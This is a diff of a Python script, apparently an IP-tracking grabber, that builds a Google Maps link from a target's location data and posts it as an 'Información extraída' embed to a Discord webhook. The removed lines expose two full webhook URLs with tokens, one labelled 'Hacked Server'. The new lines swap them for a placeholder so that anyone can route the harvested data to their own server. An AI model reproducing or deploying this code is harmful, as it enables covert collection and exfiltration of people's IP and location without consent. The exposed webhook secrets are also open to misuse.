@@ -12,11 +12,8 @@ except Exception:
 googlemap = "https://www.google.com/maps/search/google+map++" + \
 	data.get('loc')
 
-# Webhook de Hacked Server
-webhook2 = DiscordWebhook(url="https://discord.com/api/webhooks/968704408055607330/oHZ9gfKy1MIIGQTuUt-_Vq8x3Pzrsf92MY35lXPEjXG08piyS8dq1qOYoZdIBL-2W2zV", username="Ip Info")
-
-# Webhook de Reimound's Server
-webhook = DiscordWebhook(url="https://discord.com/api/webhooks/962105602971168789/a0oxgk3r9x3yTI0938jzE2Q-RMzD5o3mRV35lOpl6jH5Rf6ZW8bxvzmRaqme-nISNOHm", 
+#Ingresar url de Discord Weebhook en "Discord Weebhook URL"
+webhook = DiscordWebhook(url="Discord Weebhook URL", 
 		username="Ip Info")
 embed = DiscordEmbed(
     title="Información extraída:", description=f"[Google Maps]({googlemap})", color='03b2f8'
@@ -36,5 +33,3 @@ embed.add_embed_field(name=f"[Google Maps]", value=f'''```{googlemap}```''')
 
 webhook.add_embed(embed)
 response = webhook.execute()
-# webhook2.add_embed(embed)
-# response = webhook2.execute()
